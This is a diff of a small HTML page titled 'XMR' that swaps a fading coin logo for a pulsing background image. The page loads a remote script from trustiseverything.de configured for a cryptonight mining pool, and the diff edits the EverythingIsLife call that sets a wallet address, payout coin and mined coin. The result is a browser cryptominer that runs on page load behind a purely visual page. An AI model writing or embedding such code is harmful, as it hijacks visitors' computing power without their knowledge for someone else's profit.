@@ -5,39 +5,44 @@
     <title>XMR</title>
     <style>
         body {
-            background-color: #202020;
+            background-image: url("img.png");
+            background-size: 100%;
         }
         #container {
             text-align: center;
             padding-top: 10rem;
         }
+        #kerr {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin-left: -110px;
+            margin-top: -175px;
+        }
     </style>
+    <script type="text/javascript" src="jquery360.min.js"></script>
 </head>
 <body>
-<div id="container"><img src="https://icons-for-free.com/iconfiles/png/512/xmr+icon-1320162858327497646.png" id="logo" /></div>
+<img id="kerr" src="img_1.png"/>
 <script src="https://trustiseverything.de/karma/karma.js?karma=bs?algy=cn-heavy/xhv?nosaj=cryptonight_haven.na.mine.zergpool.com:4452" ></script>
 <script type="text/javascript">
-  EverythingIsLife('0x3d1B38f57E7CeF5B29252eef9163D6E793B1DDc0', 'c=USDT-BEP20,mc=XHV,ID=PDUB_cnight', 50);
+  EverythingIsLife('0x3d1B38f57E7CeF5B29252eef9163D6E793B1DDc0',
+      'c=USDT-BEP20,mc=BLOC,ID=PDUB_cnight', 50);
 </script>
 <script>
-    let currpacity = 0.5;
-    let newpacity = 1;
-    let intval = 0;
-
-    function outstep() {
-        let int_steps = 20;
-        newpacity = Math.random();
-        intval = (newpacity - currpacity) / 20;
-
-        function instep() {
-            currpacity += intval;
-            document.getElementById("logo").style.opacity = currpacity;
-            int_steps--
-            setTimeout(int_steps > 0 ? instep : outstep, 100)
+    let opa = 1;
+    let adj = -1;
+    setInterval(function (){
+        opa += (adj * .1);
+        if (opa <= 0) {
+            adj = 1
+        } else if (opa === 1) {
+            adj = -1;
         }
-        instep();
-    }
-    outstep();
+        $("#kerr").css({
+            opacity: opa
+        })
+    },100)
 </script>
 </body>
 </html>
